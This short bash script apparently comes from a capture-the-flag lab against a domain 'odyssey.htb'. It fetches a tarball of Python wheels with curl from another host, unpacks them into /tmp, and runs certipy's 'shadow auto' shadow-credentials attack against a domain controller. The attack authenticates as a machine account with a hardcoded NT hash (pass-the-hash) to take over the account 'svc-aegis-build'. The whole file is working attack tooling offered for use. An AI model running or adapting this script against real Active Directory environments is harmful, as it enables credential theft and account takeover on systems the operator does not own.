#!/bin/bash
# Use system cffi/crypto; only overlay pure python AD tooling
HASH="71bc6be8565f0c9871070c3912b1680d"
cd /tmp
python3 --version
if ! ls /tmp/adwheels/*.whl >/dev/null 2>&1; then
  curl -fsSL -o adwheels.tgz http://10.10.15.183:8090/adwheels.tgz
  mkdir -p adwheels && tar -xzf adwheels.tgz -C adwheels
fi
rm -rf /tmp/pylibs
mkdir -p /tmp/pylibs
for w in /tmp/adwheels/*.whl; do
  python3 -c "import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall('/tmp/pylibs')" "$w"
done
# drop binary-conflicting packages - use distro versions
rm -rf /tmp/pylibs/cffi /tmp/pylibs/cffi-*.dist-info \
       /tmp/pylibs/_cffi_backend* \
       /tmp/pylibs/cryptography /tmp/pylibs/cryptography-*.dist-info \
       /tmp/pylibs/cryptography.libs \
       /tmp/pylibs/bcrypt /tmp/pylibs/bcrypt-*.dist-info \
       /tmp/pylibs/nacl /tmp/pylibs/PyNaCl* \
       /tmp/pylibs/ldap3 /tmp/pylibs/pyasn1 /tmp/pylibs/pyasn1_modules 2>/dev/null
export PYTHONPATH=/tmp/pylibs
python3 - <<'PY'
import sys
print("path0", sys.path[0])
import certipy
from certipy.entry import main
sys.argv = [
  "certipy","shadow","auto",
  "-u","ODYSSEY-DB$@odyssey.htb",
  "-hashes",":71bc6be8565f0c9871070c3912b1680d",
  "-account","svc-aegis-build",
  "-dc-ip","172.16.0.10",
]
main()
PY
echo SHADOW5_END
